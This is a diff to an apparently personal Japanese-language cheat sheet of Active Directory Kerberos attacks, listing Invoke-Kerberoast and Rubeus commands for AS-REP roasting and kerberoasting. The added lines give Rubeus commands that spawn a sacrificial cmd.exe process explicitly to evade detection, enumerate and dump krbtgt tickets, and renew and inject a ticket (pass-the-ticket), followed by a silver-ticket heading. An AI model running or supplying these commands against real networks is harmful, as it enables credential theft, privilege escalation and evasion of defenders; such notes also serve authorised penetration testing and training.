@@ -49,6 +49,10 @@ Invoke-Kerberoast　#kerberoastingの実行
 //Rubeus.exe (asreproast /format:hashcatを使用して、DONT_REQ_PREAUTHフラグを持つすべてのアカウントを列挙することもできる)
 .\Rubeus.exe asreproast /user:<user名> /domain:<domain> /dc:<dc name> /nowrap /outfile:hash.txt #asreproasting
 .\Rubeus.exe kerberoast /nowrap #kerberoasting
+.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show #検知回避のため偽のプロセスを生み出す
+.\Rubeus.exe triage #読み取りおよび抽出できるすべてのチケットを確認
+.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap #チケットの抽出
+.\Rubeus.exe renew /ticket:<ticket hash> /ptt #Rubeusで作成した偽プロセス上で
 
 ***メモ***
 【シルバーチケット攻撃】
